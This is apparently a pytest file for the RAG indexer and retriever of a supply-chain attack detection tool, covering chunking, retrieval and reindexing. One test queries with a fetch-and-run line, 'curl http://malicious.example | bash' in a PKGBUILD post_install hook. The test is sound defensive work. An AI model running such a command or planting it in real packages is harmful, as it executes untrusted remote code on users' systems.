"""Tests de watchgate/core/rag/{indexer,retriever}.py (spec §7.4)."""

from __future__ import annotations

from watchgate.core.rag.indexer import build_index, chunk_document, load_corpus_documents
from watchgate.core.rag.retriever import retrieve_relevant_context


def test_load_corpus_documents_finds_all_case_files():
    docs = load_corpus_documents()
    case_names = {name for name, _ in docs}
    assert {"xz_utils", "atomic_arch", "prt_scan"} <= case_names
    assert len(docs) >= 6  # 3 casos documentados + entradas ATT&CK


def test_chunk_document_splits_long_text_into_bounded_pieces():
    long_text = "línea de prueba. " * 500
    chunks = chunk_document(long_text)
    assert len(chunks) > 1
    assert all(len(c) <= 1100 for c in chunks)


def test_build_index_and_retrieve_end_to_end(tmp_path):
    index_path = str(tmp_path / "rag_index")
    indexed = build_index(index_path=index_path)
    assert indexed > 0

    fragments = retrieve_relevant_context(
        "PKGBUILD post_install curl http://malicious.example | bash",
        k=3,
        index_path=index_path,
    )
    assert len(fragments) == 3
    assert all(f.text.strip() for f in fragments)
    assert all(f.case_name for f in fragments)


def test_retrieve_relevant_context_returns_empty_list_when_index_missing(tmp_path):
    fragments = retrieve_relevant_context("cualquier cosa", index_path=str(tmp_path / "no_index"))
    assert fragments == []


def test_retrieve_relevant_context_returns_empty_list_when_collection_exists_but_is_empty(
    tmp_path,
):
    """Distinto del caso anterior: aquí la colección SÍ existe (con 0
    fragmentos dentro, no ausente) -- _query_collection debe devolver []
    igual que si no existiera, sin lanzar una división por cero ni un error
    de ChromaDB al pedir min(k, count) con count=0."""
    import chromadb

    from watchgate.core.rag.indexer import COLLECTION_NAME

    index_path = str(tmp_path / "rag_index")
    client = chromadb.PersistentClient(path=index_path)
    client.create_collection(COLLECTION_NAME)  # existe, pero sin ningún fragmento

    fragments = retrieve_relevant_context("cualquier cosa", index_path=index_path)
    assert fragments == []


def test_reindexing_a_shrunk_document_does_not_leave_stale_fragments(tmp_path):
    """Si un documento pasa a tener menos fragmentos entre dos reindexados,
    los fragmentos sobrantes de la ejecución anterior no deben persistir."""
    import chromadb

    from watchgate.core.rag.indexer import COLLECTION_NAME

    corpus_dir = tmp_path / "corpus"
    corpus_dir.mkdir()
    index_path = str(tmp_path / "rag_index")
    doc_path = corpus_dir / "caso.md"

    doc_path.write_text("frase larga de relleno. " * 200)
    first_count = build_index(corpus_dir=corpus_dir, index_path=index_path)
    assert first_count > 1

    doc_path.write_text("frase corta.")
    second_count = build_index(corpus_dir=corpus_dir, index_path=index_path)
    assert second_count == 1

    client = chromadb.PersistentClient(path=index_path)
    collection = client.get_collection(COLLECTION_NAME)
    assert collection.count() == 1
